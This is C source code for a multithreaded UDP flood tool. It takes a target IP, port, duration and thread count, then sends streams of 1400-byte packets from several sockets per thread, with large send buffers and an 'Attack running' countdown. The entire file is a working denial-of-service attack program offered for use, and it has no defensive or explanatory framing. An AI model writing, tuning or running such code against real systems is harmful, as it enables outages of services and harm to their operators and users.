#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <errno.h>

// Optimized configuration
#define MAX_PACKET_SIZE 1400
#define MAX_SOCKETS_PER_THREAD 4  // Reduced from 16 to 4
#define SOCKET_BUFFER_SIZE (1024 * 1024 * 100)  // Increased to 100MB

typedef struct {
    char *target_ip;
    int target_port;
    volatile int *running;
} AttackParams;

char packet[MAX_PACKET_SIZE];

// Optimized countdown remains
void display_countdown(int duration) {
    for (int i = duration; i > 0; i--) {
        printf("\rAttack running... Time remaining: %02d:%02d", (i-1)/60, (i-1)%60);
        fflush(stdout);
        sleep(1);
    }
    printf("\rAttack completed!                          \n");
}

// Optimized flood function with better socket management
void* udp_flood(void *arg) {
    AttackParams *params = (AttackParams*)arg;
    struct sockaddr_in dest_addr;
    int socks[MAX_SOCKETS_PER_THREAD];
    int sock_count = 0;

    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(params->target_port);
    inet_pton(AF_INET, params->target_ip, &dest_addr.sin_addr);

    // Create sockets with reuse options
    for (int i = 0; i < MAX_SOCKETS_PER_THREAD; i++) {
        int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (sock >= 0) {
            int reuse = 1;
            setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
            setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &reuse, sizeof(reuse));
            
            int buf_size = SOCKET_BUFFER_SIZE;
            setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
            socks[sock_count++] = sock;
        }
    }

    // Optimized attack loop with controlled pacing
    struct timespec ts = {0, 10000000}; // 10ms delay between batches
    while (*params->running) {
        for (int s = 0; s < sock_count; s++) {
            sendto(socks[s], packet, MAX_PACKET_SIZE, 0,
                  (struct sockaddr*)&dest_addr, sizeof(dest_addr));
        }
        nanosleep(&ts, NULL); // Add small delay to reduce CPU load
    }

    // Force socket cleanup
    for (int i = 0; i < sock_count; i++) {
        shutdown(socks[i], SHUT_RDWR);
        close(socks[i]);
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 4) {
        printf("Usage: %s <IP> <PORT> <DURATION> [THREADS]\n", argv[0]);
        return 1;
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = (argc > 4) ? atoi(argv[4]) : 4;

    // Validate thread count
    if (threads < 1 || threads > 256) {
        printf("Thread count must be between 1-256\n");
        return 1;
    }

    // Initialize packet once
    memset(packet, 0xAA, MAX_PACKET_SIZE); // Fixed pattern for efficiency

    volatile int running = 1;
    pthread_t *threads_arr = malloc(threads * sizeof(pthread_t));
    AttackParams *params = calloc(threads, sizeof(AttackParams));

    // Start optimized attack threads
    for (int i = 0; i < threads; i++) {
        params[i].target_ip = ip;
        params[i].target_port = port;
        params[i].running = &running;
        
        if (pthread_create(&threads_arr[i], NULL, udp_flood, &params[i])) {
            perror("Thread creation failed");
            running = 0;
            break;
        }
    }

    display_countdown(duration);
    running = 0;

    // Force thread cleanup
    for (int i = 0; i < threads; i++) {
        pthread_join(threads_arr[i], NULL);
    }
    
    free(threads_arr);
    free(params);

    // Force kernel to cleanup networking state
    sleep(1);
    return 0;
}